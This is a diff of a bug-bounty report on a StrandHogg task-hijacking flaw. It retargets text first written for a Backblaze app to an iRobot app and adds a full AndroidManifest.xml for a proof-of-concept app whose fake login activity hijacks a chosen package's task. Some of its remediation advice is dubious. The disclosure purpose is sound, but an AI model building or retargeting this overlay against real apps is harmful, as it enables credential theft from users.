@@ -1,18 +1,72 @@
-## Security Vulnerability Report: StrandHogg Bug in Backblaze Android App
+## Security Vulnerability Report: StrandHogg Bug in iRobot Android App
 
 ### Description:
-I would like to report a critical security vulnerability, known as the StrandHogg bug, in the Backblaze Android app. This vulnerability allows a malicious application to pose as the legitimate Backblaze app and perform various unauthorized actions on behalf of the user. The bug leverages a flaw in Android's multitasking system, enabling attackers to hijack the user's session and potentially gain access to sensitive information.
+I would like to report a critical security vulnerability, known as the StrandHogg bug, in the iRobot Android app. This vulnerability allows a malicious application to pose as the legitimate iRobot app and perform various unauthorized actions on behalf of the user. The bug leverages a flaw in Android's multitasking system, enabling attackers to hijack the user's session and potentially gain access to sensitive information.
 
 ### Proof of Concept (PoC):
-1. Install a malicious app (attacker-controlled) on the same device as the Backblaze app. (Attached exploit APK)
-2. Launch the malicious app, then open the original Backblaze app. Clicking the back button triggers the StrandHogg vulnerability, as shown in the PoC video.
-   - When the user taps back on the original Backblaze app, a fake page appears.
-3. The malicious app will appear as a legitimate Backblaze app on the device screen.
-4. When the user interacts with the fake Backblaze app, the attacker can perform malicious actions, such as capturing login credentials, reading sensitive data, sending fraudulent messages, or initiating unauthorized transactions.
+1. Install a malicious app (attacker-controlled) on the same device as the iRobot app. (Attached exploit APK)
+2. Launch the malicious app, then open the original iRobot app. Clicking the back button triggers the StrandHogg vulnerability, as shown in the PoC video.
+   - When the user taps back on the original iRobot app, a fake page appears.
+3. The malicious app will appear as a legitimate iRobot app on the device screen.
+4. When the user interacts with the fake iRobot app, the attacker can perform malicious actions, such as capturing login credentials, reading sensitive data, sending fraudulent messages, or initiating unauthorized transactions.
    - PoC video is attached for better understanding.
 
+[irobot.mp4](https://bugcrowd.com/irobot/submissions/1cd36387-264d-45b6-b722-e24b2c90c20f/attachments/16b02c36-f9c0-4efa-9ade-305595fd4714 "irobot.mp4")
+
+## Building PoC APK:
+1. Create a project in android in android studio
+1. Edit the package name to `dev.lucasnlm.strandhogg`, as this is used further in our AndroidManifest.xml file
+1. Edit `AndroidManifest.xml` file and add the below code into it:
+
+```
+<manifest
+    android:compileSdkVersion="33"
+    android:compileSdkVersionCodename="13"
+    package="dev.lucasnlm.strandhogg"
+    platformBuildVersionCode="33"
+    platformBuildVersionName="13"
+    xmlns:android="http://schemas.android.com/apk/res/android">
+    <application
+        android:theme="@style/AppTheme"
+        android:label="@string/app_name"
+        android:icon="@mipmap/ic_launcher"
+        android:debuggable="true"
+        android:allowBackup="false"
+        android:supportsRtl="true"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:appComponentFactory="androidx.core.app.CoreComponentFactory">
+        <activity
+            android:name="ch.nexusinformatik.strandhogg.InoffensiveActivity"
+            android:launchMode="singleInstance">
+            <intent-filter>
+                <action
+                    android:name="android.intent.action.MAIN" />
+                <category
+                    android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name="ch.nexusinformatik.strandhogg.FakeLoginActivity"
+            android:exported="true"
+            android:taskAffinity="com.example.android"
+            android:allowTaskReparenting="true" />
+    </application>
+</manifest>
+``` 
+
+1. Now change the the `com.example.android` to the target package name accordingly. (4th line from bottom)
+1. After this, build the project, install the apk file and reproduce the vulnerability as written in PoC steps.
+
+## How to verify the exploit is triggered:
+1. Open the target apk, pause (background) it by clicking the home button.
+1. Open exploit apk.
+1. Go in recent tabs and resume the target apk.
+1. If you see exploit apk's activity on resuming (visiting) back the target apk's activity, It means the exploit apk has overridden the target apk's activity.
+
+**Hence, it is  verified, the exploit is working fine.** 
+
 ### Impact:
-The impact of this vulnerability can be severe, compromising the privacy and security of Backblaze users. The following are potential risks and consequences:
+The impact of this vulnerability can be severe, compromising the privacy and security of iRobot users. The following are potential risks and consequences:
 
 - *Credential Theft:* Attackers can capture login credentials (username and password) entered by users and use them to gain unauthorized access to user accounts.
 - *Sensitive Data Exposure:* Personal information, including contact lists, messages, and sensitive business data, may be accessed and exploited by attackers.
@@ -20,13 +74,10 @@ The impact of this vulnerability can be severe, compromising the privacy and sec
 - *Unauthorized Actions:* Attackers can manipulate the app's functionalities to perform actions on behalf of the user, such as sending misleading messages, accessing location data, or making unwanted calls.
 
 ### Remediation:
-To address this vulnerability in the Backblaze app, the following steps can be taken:
+To address this vulnerability in the iRobot app, the following steps can be taken:
 
 1. Set the `launchMode` to `singleInstance`, which will prevent other activities from becoming a part of its task.
 2. Add a custom `onBackPressed()` function to override the default behavior.
 3. Setting `taskAffinity=""` can be a quick fix for this issue.
 
 Please let me know if you require any further information or assistance regarding this vulnerability.
-
-Best regards,
-[Your Name]
